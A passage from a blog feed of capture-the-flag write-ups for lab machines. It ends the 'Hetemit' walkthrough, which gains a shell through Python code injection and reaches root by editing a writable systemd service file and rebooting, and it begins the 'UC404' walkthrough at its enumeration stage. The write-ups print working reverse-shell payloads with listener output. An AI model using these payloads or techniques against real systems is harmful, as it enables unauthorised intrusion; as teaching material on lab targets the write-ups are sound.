&lt;p&gt;The entire payload is as follow:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /verify HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,&lt;span class=&quot;ge&quot;&gt;*/*&lt;/span&gt;;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

code=__import__(&quot;os&quot;).system(&quot;bash+-c+&apos;bash+-i+&amp;gt;%26+/dev/tcp/192.168.49.101/80+0&amp;gt;%261&apos;&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the request is sent, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmeeks&lt;/code&gt; after a few seconds.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.101] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.101.117] 43194
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1400&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;cmeeks
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cmeeks&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cmeeks&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cmeeks&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;misconfigured-service-file&quot;&gt;&lt;strong&gt;Misconfigured Service File&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Enumerating the target system locally exposes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pythonapp.service&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; cmeeks &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;home&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;proc&quot;&lt;/span&gt;
  5015736      4 &lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;   1  root     cmeeks        302 Nov 13  2020 /etc/systemd/system/pythonapp.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Essentially, the service file allows a service to run as the system boots. Since we have a write permission against the file, we can obviously inject a malicious command and wait until the system boots up and obtain the reverse shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, we should adjust the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pythonapp.service&lt;/code&gt;. It depends on how we want the code to be executed.&lt;/p&gt;

&lt;p&gt;The following payload will initilize a reverse connection to our machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano /etc/systemd/system/pythonapp.service
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]                                     
&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;simple                   
&lt;span class=&quot;nv&quot;&gt;WorkingDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/cmeeks/restjson_hetemit
&lt;span class=&quot;nv&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.101/18000 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;TimeoutSec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30                             
&lt;span class=&quot;nv&quot;&gt;RestartSec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15s                                
&lt;span class=&quot;nv&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root
&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/kill &lt;span class=&quot;nt&quot;&gt;-USR1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$MAINPID&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on-failure
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, we need to wait until the system reboots, or there is another option …&lt;/p&gt;

&lt;h4 id=&quot;sudo-permission&quot;&gt;&lt;strong&gt;SUDO Permission&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;User &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmeeks&lt;/code&gt; can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shutdown&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;halt&lt;/code&gt; the system with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privilege.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cmeeks on hetemit:
    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin

User cmeeks may run the following commands on hetemit:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot&lt;/code&gt; is exactly what we’re searching for!. Now, on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmeeks&lt;/code&gt; shell, execute.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cmeeks@hetemit restjson_hetemit]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /sbin/reboot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At the same time, we should open up another terminal on local host with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener ready on port 18000.&lt;/p&gt;

&lt;p&gt;After a few seconds, we got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 18000                                                                                                                                                                      130 ⨯
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 18000 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.101] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.101.117] 42660
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1211&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@hetemit restjson_hetemit]# &lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;root
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@hetemit restjson_hetemit]# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="linux" /><category term="pg" /><summary type="html">Summary of Result Hetemit is a system where we’ll exploit the Code Injection vulnerability to acquire an initial access. We’ll then escalate our privilege by abusing a misconfigured service file and compromise root access.</summary></entry><entry><title type="html">UC404 - OSPG</title><link href="https://jayngng.github.io/blog/uc404-ospg/" rel="alternate" type="text/html" title="UC404 - OSPG" /><published>2021-08-30T23:39:26+10:00</published><updated>2021-08-30T23:39:26+10:00</updated><id>https://jayngng.github.io/blog/uc404---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/uc404-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We gain the initial access by exploiting the command injection vulnerability of a web application. We’ll then compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt; - a local user via plain-text password stored in a backup file. As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brian&lt;/code&gt;, we can execute a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command and successfully acquire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE  REASON         VERSION                      
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;              
| http-git:
|   192.168.72.109:80/.git/
|     Git repository found!               
|     Repository description: Unnamed repository&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; edit this file &lt;span class=&quot;s1&quot;&gt;&apos;description&apos;&lt;/span&gt; to name the...            
|     Remotes:          
|       https://github.com/ColorlibHQ/AdminLTE.git  
|_    Project &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: Ruby on Rails web application &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guessed from .gitignore&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: AdminLTE 3 | Dashboard
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100227)&lt;/span&gt;
36931/tcp open  mountd   syn-ack ttl 63 1-3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100005)&lt;/span&gt;
44931/tcp open  nlockmgr syn-ack ttl 63 1-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100021)&lt;/span&gt;
45359/tcp open  mountd   syn-ack ttl 63 1-3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100005)&lt;/span&gt;
55419/tcp open  mountd   syn-ack ttl 63 1-3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100005)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a few running services. Yet, we drop our attention to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;web-application&quot;&gt;&lt;strong&gt;Web Application&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s us first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; hidden directories against the server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; directories.txt 
index.html              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 60628, Words: 23683, Lines: 1480]
index2.html             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 71875, Words: 29353, Lines: 1710]
index3.html             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 42799, Words: 17135, Lines: 1126]
.git                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 315, Words: 20, Lines: 10]
.gitignore              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 1213, Words: 16, Lines: 72]
wp-forum.phps           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 279, Words: 20, Lines: 10]
demo                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 317, Words: 20, Lines: 10]
plugins                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 320, Words: 20, Lines: 10]
db                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 315, Words: 20, Lines: 10]
dist                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 317, Words: 20, Lines: 10]
build                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 318, Words: 20, Lines: 10]
LICENSE                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 1082, Words: 155, Lines: 21]
under_construction      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 331, Words: 20, Lines: 10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking over the results, there exists several enchanting directories and files.  Particularly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/under_construction&lt;/code&gt; looks compelling to investigate.&lt;/p&gt;

&lt;p&gt;→ Fuzzing the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/under_construction&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.250.109/under_construction/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; raft-small-files.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; .php
index.php               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 2950, Words: 111, Lines: 76]
register.html           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 3127, Words: 130, Lines: 80]
forgot.php              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 2729, Words: 333, Lines: 73]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Futher enumerating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;register.html&lt;/code&gt; yielded a dead end. We draw our attention to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forgot.php&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Let’s us have a look at the page source of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forgot.php&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.250.109/under_construction/forgot.php | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]

&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; For security reasons we are working to blacklist some characters &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;

//--&amp;gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]                       
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above line divulges some characters are not properly sanitized in the user input. Moreover, it’s worth giving attention to the last two lines of the same page source.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

Could not open input file: sendmail.php
1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When it comes to &lt;strong&gt;parameter&lt;/strong&gt; pentesting, its not trivial to perform both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; requests against the entry.&lt;/p&gt;

&lt;p&gt;Now, we can check if the paramater &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt; is vulnerable by throwing some random special characters. This can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.250.109/under_construction/forgot.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;
&amp;lt;/html&amp;gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Under Construction &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;

sendmail.php must receive the variable from the html form and send the message.

&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; For security reasons we are working to blacklist some characters &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;

//--&amp;gt;

2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By casting a single quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;) into the entry, we observe an abnormal behavior of the web server in the last two lines.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Previous&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

Could not open input file: sendmail.php
1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Now&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We know that the character might break something at the backend.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;command-injection&quot;&gt;&lt;strong&gt;Command Injection&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;method-1---automatic&quot;&gt;&lt;strong&gt;Method 1 - Automatic&lt;/strong&gt;&lt;/h5&gt;
&lt;p&gt;Using the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.py&lt;/code&gt; script given a list of command injection payloads (&lt;a href=&quot;https://github.com/payloadbox/command-injection-payload-list&quot;&gt;here.&lt;/a&gt;)&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
